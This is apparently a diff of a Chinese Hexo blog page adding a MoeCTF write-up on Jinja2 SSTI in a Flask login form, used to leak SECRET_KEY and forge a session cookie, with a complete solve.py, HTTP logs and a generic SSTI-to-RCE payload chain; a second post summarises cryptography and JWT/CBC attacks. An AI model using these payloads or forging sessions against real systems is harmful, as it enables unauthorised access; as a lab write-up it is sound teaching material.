@@ -71,6 +71,154 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-moectf-ssti-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/18/moectf-ssti-writeup/" class="article-date">
+  <time class="dt-published" datetime="2026-10-17T16:00:00.000Z" itemprop="datePublished">2026-10-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>►<a class="article-category-link" href="/categories/CTF/Web/">Web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="用户管理系统"><a href="#用户管理系统" class="headerlink" title="用户管理系统"></a><em>用户管理系统</em></h2><blockquote>
+<p>：Flask &#x2F; Werkzeug 3.1.8 &#x2F; Python 3.11.15<br><strong>Flag</strong><br><code>moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;</code></p>
+<p><strong>考点</strong></p>
+<p>：Jinja2 SSTI、长度限制绕过思维、</p>
+<p><code></code></p>
+<p> 密钥泄露、Flask session cookie 伪造（itsdangerous）、鉴权字段枚举</p>
+</blockquote>
+<hr>
+<h2 id="一、题目概述"><a href="#一、题目概述" class="headerlink" title="一、题目概述"></a>一、题目概述</h2><p>靶机是一个 Flask 编写的「用户管理系统」，只有一个登录页和一个鉴权接口。</p>
+<ul>
+<li><code>GET /</code>：登录页（含 <code>username</code> &#x2F; <code>password</code> 表单，POST 到 <code>/login</code>）</li>
+<li><code>POST /login</code>：处理登录</li>
+<li><code>GET /user</code>：要求登录，未登录返回 <code>401 &#123;&quot;error&quot;:&quot;未登录&quot;&#125;</code><br>登录失败时后端会把 <code>username</code> 拼进模板并渲染，存在 ** Jinja2 服务端模板注入（SSTI）；同时 <code>username</code> 被限长 ** 10 字符**，逼着利用者走「短 payload 泄露密钥 → 伪造会话」而非直接 RCE</li>
+</ul>
+<hr>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br></pre></td></tr></table></figure>
+
+<p>响应头确认技术栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/3.1.8 Python/3.11.15</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Werkzeug</strong> &#x3D; Flask 的 WSGI 服务器，基本锁定 Jinja2 模板引擎</li>
+<li>页面标题「用户管理系统」，表单 <code>POST /login</code>，字段 <code>username</code>、<code>password</code></li>
+</ul>
+<hr>
+<h2 id="三、漏洞发现：SSTI-确认"><a href="#三、漏洞发现：SSTI-确认" class="headerlink" title="三、漏洞发现：SSTI 确认"></a>三、漏洞发现：SSTI 确认</h2><p>向 <code>/login</code> 提交 <code>username=49</code><br>响应错误提示：<br><code>49</code> 被求值成 <code>49</code> 并回显 → <strong>模板表达式可执行，SSTI 确认</strong>。模板结构大致为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(f&quot;用户&#123;username&#125;登录失败&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>再注入 <code></code>，能直接看到 Flask 配置对象。</p>
+<hr>
+<h2 id="四、关键限制：username-限长-10-字符"><a href="#四、关键限制：username-限长-10-字符" class="headerlink" title="四、关键限制：username 限长 10 字符"></a>四、关键限制：username 限长 10 字符</h2><p>尝试注入更长的 RCE 链时，服务端返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;error&quot;&gt;&lt;p&gt;The username cannot be too long!&lt;/p&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这提示我们：** 不要硬刚 RCE，改走「短 payload 能做的二次利用」**</p>
+<hr>
+<h2 id="五、密钥泄露："><a href="#五、密钥泄露：" class="headerlink" title="五、密钥泄露："></a>五、密钥泄露：</h2><p><code></code> 恰好 10 字符，注入后完整返回 Flask 配置，其中关键一项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br></pre></td></tr></table></figure>
+
+<p><code>SECRET_KEY</code> 是 Flask 签名会话 cookie 的密钥。拿到它，就能伪造任意合法 session </p>
+<hr>
+<h2 id="六、定位目标：路由枚举与鉴权分析"><a href="#六、定位目标：路由枚举与鉴权分析" class="headerlink" title="六、定位目标：路由枚举与鉴权分析"></a>六、定位目标：路由枚举与鉴权分析</h2><p>对所有可能路径做 fuzz：</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/</code></td>
+<td>200（登录页）</td>
+</tr>
+<tr>
+<td><code>/login</code></td>
+<td>405（仅 POST）</td>
+</tr>
+<tr>
+<td><code>/user</code></td>
+<td><strong>401</strong>（鉴权接口，返回 <code>&#123;&quot;error&quot;:&quot;未登录&quot;&#125;</code>）</td>
+</tr>
+<tr>
+<td>其余（&#x2F;admin、&#x2F;flag、&#x2F;api&#x2F;* 等）</td>
+<td>404</td>
+</tr>
+<tr>
+<td>**结论：flag 在<code>/user</code>后面，必须先通过鉴权</td>
+<td></td>
+</tr>
+<tr>
+<td>尝试登录爆破（648 组常见账号口令）均失败、且从不返回 <code>Set-Cookie</code> → <strong>登录不是「破口令」的路子</strong>，会话只能靠伪造。</td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、核心利用：伪造-Flask-session-cookie"><a href="#七、核心利用：伪造-Flask-session-cookie" class="headerlink" title="七、核心利用：伪造 Flask session cookie"></a>七、核心利用：伪造 Flask session cookie</h2><h3 id="7-1-会话-cookie-格式"><a href="#7-1-会话-cookie-格式" class="headerlink" title="7.1 会话 cookie 格式"></a>7.1 会话 cookie 格式</h3><p>Flask 的 session cookie 由 <code>itsdangerous</code> 的 <code>URLSafeTimedSerializer</code> 生成，结构为<strong>三段</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;urlsafe_b64(payload)&gt;.&lt;timestamp_base36&gt;.&lt;signature&gt;</span><br></pre></td></tr></table></figure>
+
+<p>签名参数（Flask 默认）：</p>
+<ul>
+<li><code>salt = b&quot;flask&quot;</code></li>
+<li><code>key_derivation = &quot;hmac&quot;</code></li>
+<li><code>digest_method = sha1</code></li>
+</ul>
+<h3 id="7-2-用-SECRET-KEY-签名"><a href="#7-2-用-SECRET-KEY-签名" class="headerlink" title="7.2 用 SECRET_KEY 签名"></a>7.2 用 SECRET_KEY 签名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">print(cookie)</span><br><span class="line"># eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-鉴权字段枚举（本题最坑的点）"><a href="#7-3-鉴权字段枚举（本题最坑的点）" class="headerlink" title="7.3 鉴权字段枚举（本题最坑的点）"></a>7.3 鉴权字段枚举（本题最坑的点）</h3><p>伪造 cookie 打 <code>/user</code> 时，**字段名不是常见的<code>username</code>，而是<code>token</code><br>试过的常见结构全部 401：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;admin&quot;&#125;          # 401</span><br><span class="line">&#123;&quot;logged_in&quot;: True&#125;            # 401</span><br><span class="line">&#123;&quot;is_admin&quot;: True, ...&#125;        # 401</span><br><span class="line">&#123;&quot;user&quot;: &quot;admin&quot;&#125;              # 401</span><br></pre></td></tr></table></figure>
+
+<p>命中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;token&quot;: &quot;admin&quot;&#125;             # 200 !!</span><br></pre></td></tr></table></figure>
+
+<p>这提醒我们：** 伪造会话时，字段名与值都要枚举，不能默认<code>username</code> **</p>
+<hr>
+<h2 id="八、Flag"><a href="#八、Flag" class="headerlink" title="八、Flag"></a>八、Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /user HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7623</span><br><span class="line">Cookie: session=eyJ0b2tlbiI6ImFkbWluIn0.atOPgQ.ZOs4OOQWsjhJCr96THwR4-RFjD8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag</strong> <code>moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;</code></p>
+<hr>
+<h2 id="九、完整可复现-PoC"><a href="#九、完整可复现-PoC" class="headerlink" title="九、完整可复现 PoC"></a>九、完整可复现 PoC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># solve.py</span><br><span class="line">import urllib.request</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line">BASE = &quot;[http://127.0.0.1:7623](http://127.0.0.1:7623)&quot;</span><br><span class="line">SECRET = &quot;e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d&quot;</span><br><span class="line"># 1 泄露 SECRET_KEY</span><br><span class="line">#    POST /login  username=&#123;&#123;config&#125;&#125;</span><br><span class="line">#    SECRET_KEY = e88d7921a6566694d71a7c6e60a9fda8a4c390705e07a9e919424086d216484d</span><br><span class="line"># 2 用 SECRET_KEY 伪造 session cookie</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">cookie = serializer.dumps(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line"># 3 带伪造 cookie 访问 /user</span><br><span class="line">req = urllib.request.Request(</span><br><span class="line">    BASE + &quot;/user&quot;,</span><br><span class="line">    headers=&#123;&quot;Cookie&quot;: &quot;session=&quot; + cookie&#125;)</span><br><span class="line">r = urllib.request.urlopen(req, timeout=6)</span><br><span class="line">print(&quot;HTTP&quot;, r.status)</span><br><span class="line">print(r.read().decode(&quot;utf-8&quot;))</span><br><span class="line"># HTTP 200</span><br><span class="line"># &#123;&quot;info&quot;:&quot;moectf&#123;86ddb09d-28cb-d045-be1a-04f1a81d67ce&#125;&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十、知识点与通用思路沉淀"><a href="#十、知识点与通用思路沉淀" class="headerlink" title="十、知识点与通用思路沉淀"></a>十、知识点与通用思路沉淀</h2><p><strong>SSTI 通用打法：</strong></p>
+<ol>
+<li><strong>探测</strong>：7*7 求值回显 → 确认注入点。</li>
+<li><strong>看上下文</strong>：config,self,g,session,request </li>
+<li><strong>识别限制</strong>：长度 &#x2F; 黑名单会把「直接 RCE」逼成「泄露 → 二次利用」。</li>
+<li><strong>泄露密钥 → 伪造会话</strong>：<code>SECRET_KEY</code> + <code>itsdangerous</code>（<code>salt=b&#39;flask&#39;</code>、hmac、sha1）签 session cookie。</li>
+<li><strong>枚举鉴权点与会话字段</strong>：扫路由找 <code>401</code> 接口；伪造时把 <code>token</code>&#x2F;<code>username</code>&#x2F;<code>uid</code>&#x2F;<code>role</code> 等字段和值一起枚举。</li>
+<li><strong>若确需 RCE</strong>（无长度限制时）标准链：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;</span><br><span class="line"># 或</span><br><span class="line">&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;   # 找 Popen</span><br></pre></td></tr></table></figure>
+
+<p><strong>本题题型特征</strong>：「受限 SSTI + Flask 会话伪造」，考点是「长度限制思维 + 密钥泄露 + 会话结构枚举」  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/10/18/moectf-ssti-writeup/" data-id="cmvd7vmxw000068pf79f2awor" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Jinja2/" rel="tag">Jinja2</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session%E4%BC%AA%E9%80%A0/" rel="tag">Session伪造</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-moectf复盘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/" class="article-date">
@@ -148,6 +296,9 @@
 <li>找到加密方式 找字典爆破 HMAC-SHA1（RFC 2104，密钥 &#x3D; <code>qwe123456</code>）</li>
 <li>得到新的cookie 获得青蛙</li>
 </ul>
+<blockquote>
+<p>💡 <strong>Web 知识点</strong>：<br>看到三段式 base64 cookie，先怀疑 Flask session<br>格式： payload.timestamp.signature ，三段都是 base64url，第三段 20 字节 → 直接想到 Flask&#x2F;itsdangerous<br>Flask 的签名有 salt、有密钥派生</p>
+</blockquote>
 <h2 id="古籍翻阅"><a href="#古籍翻阅" class="headerlink" title="古籍翻阅"></a><strong>古籍翻阅</strong></h2><ul>
 <li>在给的文件里找到了一个特殊的名字：<code>true_file</code></li>
 <li>随便点开一个书籍，根据 URL 规律，写一个对应的 URL 来访问这个页面</li>
@@ -293,12 +444,118 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/14/moectf%E5%A4%8D%E7%9B%98/" data-id="cmv813a2700003spfbw9qgjl5" data-title="moectf复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2026/10/14/moectf%E5%A4%8D%E7%9B%98/" data-id="cmvd7vmxy000168pf9q5wdjr3" data-title="moectf复盘" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98/" rel="tag">复盘</a></li></ul>
 
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-关于密码学" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/" class="article-date">
+  <time class="dt-published" datetime="2026-10-13T04:00:00.000Z" itemprop="datePublished">2026-10-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/">关于密码学</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="一些密码学-加密算法、哈希与认证机制"><a href="#一些密码学-加密算法、哈希与认证机制" class="headerlink" title="一些密码学 - 加密算法、哈希与认证机制"></a>一些密码学 - 加密算法、哈希与认证机制</h1><h2 id="一、-基础密码学概念"><a href="#一、-基础密码学概念" class="headerlink" title="一、 基础密码学概念"></a>一、 基础密码学概念</h2><h3 id="1-分组与块大小"><a href="#1-分组与块大小" class="headerlink" title="1. 分组与块大小"></a>1. 分组与块大小</h3><ul>
+<li><strong>块大小（Block Size）</strong>：128bit &#x2F; 16字节。现代分组密码算法每次处理固定大小的数据块，数据过长时会被切分成多个块。</li>
+<li><strong>注意</strong>：在对称加密中，加解密必须使用<strong>同一个密钥（Key）</strong>。</li>
+</ul>
+<h3 id="2-常见加密算法分类"><a href="#2-常见加密算法分类" class="headerlink" title="2. 常见加密算法分类"></a>2. 常见加密算法分类</h3><ul>
+<li><strong>对称加密</strong>：加密和解密使用同一个密钥。<ul>
+<li>**AES (Advanced Encryption Standard)**：高级加密标准，目前最主流、最安全的对称加密算法。</li>
+<li><strong>DES (Data Encryption Standard)<strong>：数据加密标准，已被淘汰，密钥长度太短（56位），</strong>极易被暴力破解</strong>。</li>
+</ul>
+</li>
+<li><strong>非对称加密</strong>：加密和解密使用不同的密钥（公钥和私钥）。<ul>
+<li><strong>RSA</strong>：最经典的非对称加密算法。公钥加密，私钥解密（或私钥签名，公钥验签）。<strong>不要求加解密双方共享同一个密钥</strong>。</li>
+</ul>
+</li>
+</ul>
+<h2 id="二、-分组密码工作模式（Modes-of-Operation）"><a href="#二、-分组密码工作模式（Modes-of-Operation）" class="headerlink" title="二、 分组密码工作模式（Modes of Operation）"></a>二、 分组密码工作模式（Modes of Operation）</h2><p>当数据大于一个块（16字节）时，需要按照特定模式将各个块串联起来进行加密。</p>
+<h3 id="1-CBC-Cipher-Block-Chaining-密码分组链接模式"><a href="#1-CBC-Cipher-Block-Chaining-密码分组链接模式" class="headerlink" title="1. CBC (Cipher Block Chaining) 密码分组链接模式"></a>1. CBC (Cipher Block Chaining) 密码分组链接模式</h3><ul>
+<li><strong>核心流程</strong>：<ol>
+<li>将一段<strong>明文</strong>分成 3 块：P1、P2、P3。</li>
+<li>P1 与 <strong>IV</strong>（初始化向量）进行异或（XOR）运算，再进入 AES 引擎加密，生成密文块 C1。</li>
+<li>P2 与上一步产生的密文 C1 进行异或（XOR），再进入 AES 引擎加密，生成密文块 C2。</li>
+<li>以此类推，每一块的加密都依赖于前一块的密文，形成链式结构。</li>
+</ol>
+</li>
+<li><strong>优点</strong>：相同明文块加密后会得到不同的密文块，安全性高。</li>
+<li><strong>缺点</strong>：不能并行加密，且如果 IV 可控，可能引发 CBC 字节翻转攻击。</li>
+</ul>
+<h3 id="2-其他常见工作模式"><a href="#2-其他常见工作模式" class="headerlink" title="2. 其他常见工作模式"></a>2. 其他常见工作模式</h3><ul>
+<li><strong>CFB (Cipher Feedback)</strong> &#x2F; **OFB (Output Feedback)**：将块密码转换为流密码。</li>
+<li>**CTR (Counter)**：计数器模式，支持并行加密，效率高。</li>
+<li><strong>GCM (Galois&#x2F;Counter Mode)<strong>：基于 CTR 模式，同时提供加密和</strong>完整性校验（认证）</strong>，是目前最推荐的模式。</li>
+</ul>
+<h2 id="三、-哈希（散列）算法"><a href="#三、-哈希（散列）算法" class="headerlink" title="三、 哈希（散列）算法"></a>三、 哈希（散列）算法</h2><ul>
+<li><strong>概念</strong>：将任意长度的数据映射为固定长度的散列值。<strong>单向、不可逆</strong>，主要用于数据完整性校验、密码存储和数字签名。</li>
+<li><strong>MD5 (Message Digest Algorithm 5)<strong>：输出 128 位哈希值，已被证明存在严重的哈希碰撞漏洞，</strong>不再安全</strong>。</li>
+<li>**SHA-256 (Secure Hash Algorithm 256)**：输出 256 位哈希值，目前广泛使用，安全性较高。</li>
+</ul>
+<h2 id="四、-令牌与认证机制：JWT-JSON-Web-Token"><a href="#四、-令牌与认证机制：JWT-JSON-Web-Token" class="headerlink" title="四、 令牌与认证机制：JWT (JSON Web Token)"></a>四、 令牌与认证机制：JWT (JSON Web Token)</h2><h3 id="1-JWT-基础"><a href="#1-JWT-基础" class="headerlink" title="1. JWT 基础"></a>1. JWT 基础</h3><ul>
+<li><strong>特点</strong>：JWT 由 Header、Payload、Signature 三部分组成。中间用 <code>.</code> 隔开。</li>
+<li><strong>编码方式</strong>：使用 <strong>Base64URL</strong> 编码。<blockquote>
+<p>JWT 使用的是 Base64URL（对 Base64 做了 <code>+</code> 变 <code>-</code>、<code>/</code> 变 <code>_</code>、去掉 <code>=</code> 的变种），而非标准 Base64。</p>
+</blockquote>
+</li>
+<li><strong>安全性核心</strong>：JWT 的明文部分（Header 和 Payload）可以被任何人解码看到，所以<strong>绝对不能存放敏感信息</strong>。其安全性<strong>完全依赖于签名（Signature）</strong>，攻击者如果篡改了数据，签名校验就会失败。</li>
+</ul>
+<h3 id="2-签名算法（Signature-Algorithms）"><a href="#2-签名算法（Signature-Algorithms）" class="headerlink" title="2. 签名算法（Signature Algorithms）"></a>2. 签名算法（Signature Algorithms）</h3><p>JWT 签名主要有两类，原理完全不同：</p>
+<ul>
+<li>**HMAC-SHA256 (HS256)**：<ul>
+<li>属于<strong>对称加密</strong>思想。</li>
+<li>服务器和客户端<strong>共享一个 Secret</strong>（密钥）。</li>
+<li>服务端使用这个 Secret 对 Header+Payload 进行哈希计算生成签名。</li>
+<li><em>安全风险</em>：如果 Secret 泄露，攻击者可以伪造任意 JWT。</li>
+</ul>
+</li>
+<li>**RSA (RS256)**：<ul>
+<li>属于<strong>非对称加密</strong>思想。</li>
+<li>服务端持有<strong>私钥（Private Key）</strong>，用来生成签名（加密哈希值）；客户端或验证方持有<strong>公钥（Public Key）</strong>，用来验证签名。</li>
+<li><strong>不需要共享 Secret</strong>。</li>
+<li><em>安全风险</em>：如果服务端配置不当，允许 HS256 和 RS256 混淆，攻击者可以利用公钥当作 HMAC 的 Secret 进行伪造（著名的 JWT 算法混淆攻击）。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="💡-安全面试常见考点提示"><a href="#💡-安全面试常见考点提示" class="headerlink" title="💡 安全面试常见考点提示"></a>💡 安全面试常见考点提示</h2><ol>
+<li><strong>JWT 的 <code>alg</code> 字段</strong>：常用来指定签名算法，如果后端没有强制校验算法，攻击者可以改成 <code>none</code> 绕过签名。</li>
+<li><strong>CBC 字节翻转</strong>：在 CBC 模式中，如果攻击者控制了 IV 和密文，修改前一块密文会影响到后一块明文的解密结果（XOR特性），常用于绕过权限验证。</li>
+<li><strong>MD5 长度扩展攻击</strong>：MD5、SHA1 等基于 Merkle–Damgård 结构的哈希函数存在长度扩展攻击风险。</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/" data-id="cmvd7vmy4000n68pffjs29r9m" data-title="关于密码学" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
     </footer>
   </div>
   
@@ -410,113 +667,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/13/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cmv813a2g000g3spfdmfh63oi" data-title="关于渗透测试" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-关于密码学" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/" class="article-date">
-  <time class="dt-published" datetime="2026-10-13T04:00:00.000Z" itemprop="datePublished">2026-10-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/">关于密码学</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="一些密码学-加密算法、哈希与认证机制"><a href="#一些密码学-加密算法、哈希与认证机制" class="headerlink" title="一些密码学 - 加密算法、哈希与认证机制"></a>一些密码学 - 加密算法、哈希与认证机制</h1><h2 id="一、-基础密码学概念"><a href="#一、-基础密码学概念" class="headerlink" title="一、 基础密码学概念"></a>一、 基础密码学概念</h2><h3 id="1-分组与块大小"><a href="#1-分组与块大小" class="headerlink" title="1. 分组与块大小"></a>1. 分组与块大小</h3><ul>
-<li><strong>块大小（Block Size）</strong>：128bit &#x2F; 16字节。现代分组密码算法每次处理固定大小的数据块，数据过长时会被切分成多个块。</li>
-<li><strong>注意</strong>：在对称加密中，加解密必须使用<strong>同一个密钥（Key）</strong>。</li>
-</ul>
-<h3 id="2-常见加密算法分类"><a href="#2-常见加密算法分类" class="headerlink" title="2. 常见加密算法分类"></a>2. 常见加密算法分类</h3><ul>
-<li><strong>对称加密</strong>：加密和解密使用同一个密钥。<ul>
-<li>**AES (Advanced Encryption Standard)**：高级加密标准，目前最主流、最安全的对称加密算法。</li>
-<li><strong>DES (Data Encryption Standard)<strong>：数据加密标准，已被淘汰，密钥长度太短（56位），</strong>极易被暴力破解</strong>。</li>
-</ul>
-</li>
-<li><strong>非对称加密</strong>：加密和解密使用不同的密钥（公钥和私钥）。<ul>
-<li><strong>RSA</strong>：最经典的非对称加密算法。公钥加密，私钥解密（或私钥签名，公钥验签）。<strong>不要求加解密双方共享同一个密钥</strong>。</li>
-</ul>
-</li>
-</ul>
-<h2 id="二、-分组密码工作模式（Modes-of-Operation）"><a href="#二、-分组密码工作模式（Modes-of-Operation）" class="headerlink" title="二、 分组密码工作模式（Modes of Operation）"></a>二、 分组密码工作模式（Modes of Operation）</h2><p>当数据大于一个块（16字节）时，需要按照特定模式将各个块串联起来进行加密。</p>
-<h3 id="1-CBC-Cipher-Block-Chaining-密码分组链接模式"><a href="#1-CBC-Cipher-Block-Chaining-密码分组链接模式" class="headerlink" title="1. CBC (Cipher Block Chaining) 密码分组链接模式"></a>1. CBC (Cipher Block Chaining) 密码分组链接模式</h3><ul>
-<li><strong>核心流程</strong>：<ol>
-<li>将一段<strong>明文</strong>分成 3 块：P1、P2、P3。</li>
-<li>P1 与 <strong>IV</strong>（初始化向量）进行异或（XOR）运算，再进入 AES 引擎加密，生成密文块 C1。</li>
-<li>P2 与上一步产生的密文 C1 进行异或（XOR），再进入 AES 引擎加密，生成密文块 C2。</li>
-<li>以此类推，每一块的加密都依赖于前一块的密文，形成链式结构。</li>
-</ol>
-</li>
-<li><strong>优点</strong>：相同明文块加密后会得到不同的密文块，安全性高。</li>
-<li><strong>缺点</strong>：不能并行加密，且如果 IV 可控，可能引发 CBC 字节翻转攻击。</li>
-</ul>
-<h3 id="2-其他常见工作模式"><a href="#2-其他常见工作模式" class="headerlink" title="2. 其他常见工作模式"></a>2. 其他常见工作模式</h3><ul>
-<li><strong>CFB (Cipher Feedback)</strong> &#x2F; **OFB (Output Feedback)**：将块密码转换为流密码。</li>
-<li>**CTR (Counter)**：计数器模式，支持并行加密，效率高。</li>
-<li><strong>GCM (Galois&#x2F;Counter Mode)<strong>：基于 CTR 模式，同时提供加密和</strong>完整性校验（认证）</strong>，是目前最推荐的模式。</li>
-</ul>
-<h2 id="三、-哈希（散列）算法"><a href="#三、-哈希（散列）算法" class="headerlink" title="三、 哈希（散列）算法"></a>三、 哈希（散列）算法</h2><ul>
